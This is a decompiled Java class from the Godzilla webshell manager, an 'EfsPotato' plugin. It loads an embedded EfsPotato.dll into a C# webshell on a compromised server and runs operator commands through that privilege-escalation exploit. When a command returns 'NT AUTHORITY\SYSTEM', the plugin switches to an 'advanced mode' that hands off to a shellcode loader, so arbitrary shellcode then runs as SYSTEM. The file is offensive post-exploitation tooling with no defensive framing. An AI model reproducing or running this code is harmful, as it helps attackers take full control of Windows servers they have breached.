/*     */ package shells.plugins.cshap;
/*     */ 
/*     */ import core.Encoding;
/*     */ import core.annotation.PluginAnnotation;
/*     */ import core.imp.Payload;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.component.RTextArea;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import java.awt.BorderLayout;
/*     */ import java.awt.Component;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.awt.event.ComponentAdapter;
/*     */ import java.awt.event.ComponentEvent;
/*     */ import java.io.InputStream;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JSplitPane;
/*     */ import javax.swing.JTextField;
/*     */ import shells.plugins.generic.ShellcodeLoader;
/*     */ import util.Log;
/*     */ import util.automaticBindClick;
/*     */ import util.functions;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ @PluginAnnotation(payloadName = "CShapDynamicPayload", Name = "EfsPotato", DisplayName = "EfsPotato")
/*     */ public class EfsPotato
/*     */   extends ShellcodeLoader
/*     */ {
/*     */   private static final String CLASS_NAME = "EfsPotato.EfsPotato";
/*     */   private final JPanel panel;
/*     */   private final JPanel mainPanel;
/*     */   private final JButton loadButton;
/*     */   private final JButton runButton;
/*     */   private final JTextField commandTextField;
/*     */   
/*     */   public EfsPotato() {
/*  42 */     this.panel = new JPanel(new BorderLayout());
/*  43 */     this.mainPanel = new JPanel(new BorderLayout());
/*  44 */     this.loadButton = new JButton("Load");
/*  45 */     this.runButton = new JButton("Run");
/*  46 */     this.commandTextField = new JTextField(35);
/*  47 */     this.resultTextArea = new RTextArea();
/*  48 */     this.splitPane = new JSplitPane();
/*     */     
/*  50 */     this.splitPane.setOrientation(0);
/*  51 */     this.splitPane.setDividerSize(0);
/*     */     
/*  53 */     JPanel topPanel = new JPanel();
/*     */     
/*  55 */     topPanel.add(this.loadButton);
/*  56 */     topPanel.add(this.commandTextField);
/*  57 */     topPanel.add(this.runButton);
/*     */     
/*  59 */     this.splitPane.setTopComponent(topPanel);
/*  60 */     this.splitPane.setBottomComponent(new JScrollPane((Component)this.resultTextArea));
/*     */     
/*  62 */     this.splitPane.addComponentListener(new ComponentAdapter()
/*     */         {
/*     */           public void componentResized(ComponentEvent e) {
/*  65 */             EfsPotato.this.splitPane.setDividerLocation(0.15D);
/*     */           }
/*     */         });
/*     */     
/*  69 */     this.panel.add(this.splitPane);
/*     */     
/*  71 */     this.commandTextField.setText("cmd /c whoami");
/*  72 */     this.mainPanel.add(this.panel);
/*     */   }
/*     */   private final JSplitPane splitPane; private final RTextArea resultTextArea; private boolean loadState; private ShellEntity shellEntity; private Payload payload; private Encoding encoding; private boolean superModel;
/*     */   
/*     */   public boolean load() {
/*  77 */     if (!this.loadState) {
/*     */       try {
/*  79 */         InputStream inputStream = getClass().getResourceAsStream("assets/EfsPotato.dll");
/*  80 */         byte[] data = functions.readInputStream(inputStream);
/*  81 */         inputStream.close();
/*  82 */         if (this.payload.include("EfsPotato.EfsPotato", data)) {
/*  83 */           this.loadState = true;
/*  84 */           return this.loadState;
/*     */         } 
/*  86 */         return false;
/*     */       }
/*  88 */       catch (Exception e) {
/*  89 */         Log.error(e);
/*     */       } 
/*     */     }
/*     */     
/*  93 */     return this.loadState;
/*     */   }
/*     */ 
/*     */   
/*     */   public String getClassName() {
/*  98 */     return "EfsPotato.EfsPotato";
/*     */   }
/*     */   
/*     */   private void loadButtonClick(ActionEvent actionEvent) {
/* 102 */     if (load()) {
/* 103 */       GOptionPane.showMessageDialog(this.panel, "Load success", "提示", 1);
/*     */     } else {
/* 105 */       GOptionPane.showMessageDialog(this.panel, "Load fail", "提示", 2);
/*     */     } 
/*     */   }
/*     */   private void runButtonClick(ActionEvent actionEvent) {
/* 109 */     ReqParameter parameter = new ReqParameter();
/* 110 */     parameter.add("cmd", this.commandTextField.getText());
/* 111 */     byte[] result = this.payload.evalFunc("EfsPotato.EfsPotato", "run", parameter);
/*     */     
/* 113 */     this.resultTextArea.setText(this.encoding.Decoding(result));
/*     */     
/* 115 */     if (!this.superModel && result != null && this.encoding.Decoding(result).toUpperCase().indexOf("NT AUTHORITY\\SYSTEM") != -1) {
/* 116 */       this.superModel = true;
/* 117 */       this.mainPanel.remove(this.panel);
/* 118 */       this.mainPanel.add(super.getView());
/* 119 */       this.tabbedPane.addTab("EfsPotato", this.panel);
/* 120 */       this.tabbedPane.setSelectedIndex(this.tabbedPane.getTabCount() - 1);
/* 121 */       ShellcodeLoader loader = (ShellcodeLoader)this.shellEntity.getFrame().getPlugin("ShellcodeLoader");
/* 122 */       if (loader != null) {
/* 123 */         loader.childLoder = this;
/*     */       }
/* 125 */       GOptionPane.showMessageDialog(this.panel, "您是SYSTEM! 已升级到高级模式", "提示", 1);
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] runShellcode(ReqParameter reqParameter, String command, byte[] shellcode, int readWait) {
/* 132 */     reqParameter.add("cmd", command);
/* 133 */     reqParameter.add("readWait", Integer.toString(readWait));
/* 134 */     return super.runShellcode(reqParameter, command, shellcode, readWait);
/*     */   }
/*     */ 
/*     */   
/*     */   public void init(ShellEntity shellEntity) {
/* 139 */     super.init(shellEntity);
/* 140 */     this.shellEntity = shellEntity;
/* 141 */     this.payload = this.shellEntity.getPayloadModule();
/* 142 */     this.encoding = Encoding.getEncoding(this.shellEntity);
/* 143 */     automaticBindClick.bindJButtonClick(this, this);
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public JPanel getView() {
/* 150 */     super.getView();
/* 151 */     return this.mainPanel;
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\cshap\EfsPotato.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */